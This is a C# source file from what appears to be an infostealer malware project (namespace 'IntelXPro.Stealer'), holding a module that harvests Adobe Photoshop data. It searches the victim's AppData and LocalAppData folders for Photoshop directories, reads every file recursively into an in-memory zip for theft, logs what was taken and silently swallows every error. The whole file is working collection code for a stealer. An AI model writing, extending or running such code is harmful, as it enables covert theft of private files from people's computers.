using System;
using System.IO;
using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Adobe
{
    internal class Photoshop : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

                CollectFromPath(Path.Combine(appDataPath, "Adobe"), "Photoshop", zip, counter);
                CollectFromPath(Path.Combine(localAppDataPath, "Adobe"), "Photoshop", zip, counter);
            }
            catch { }
        }

        private void CollectFromPath(string basePath, string appName, InMemoryZip zip, Counter counter)
        {
            try
            {
                if (Directory.Exists(basePath))
                {
                    string[] directories = Directory.GetDirectories(basePath, "*Photoshop*", SearchOption.TopDirectoryOnly);
                    
                    foreach (string photoshopDir in directories)
                    {
                        CollectFiles(photoshopDir, appName, zip, counter);
                    }
                }
            }
            catch { }
        }

        private void CollectFiles(string sourcePath, string appName, InMemoryZip zip, Counter counter)
        {
            try
            {
                if (Directory.Exists(sourcePath))
                {
                    var adobeApp = new Counter.CounterApplications { Name = "Adobe Photoshop" };
                    string[] files = Directory.GetFiles(sourcePath, "*", SearchOption.AllDirectories);
                    
                    foreach (string file in files)
                    {
                        try
                        {
                            if (File.Exists(file))
                            {
                                string relativePath = file.Replace(sourcePath, "").TrimStart('\\');
                                string zipPath = Path.Combine("Adobe", appName, relativePath);
                                
                                byte[] fileData = File.ReadAllBytes(file);
                                zip.AddFile(zipPath, fileData);
                                adobeApp.Files.Add(zipPath);
                            }
                        }
                        catch { }
                    }
                    
                    if (adobeApp.Files.Count > 0)
                    {
                        counter.Applications.Add(adobeApp);
                    }
                }
            }
            catch { }
        }
    }
}
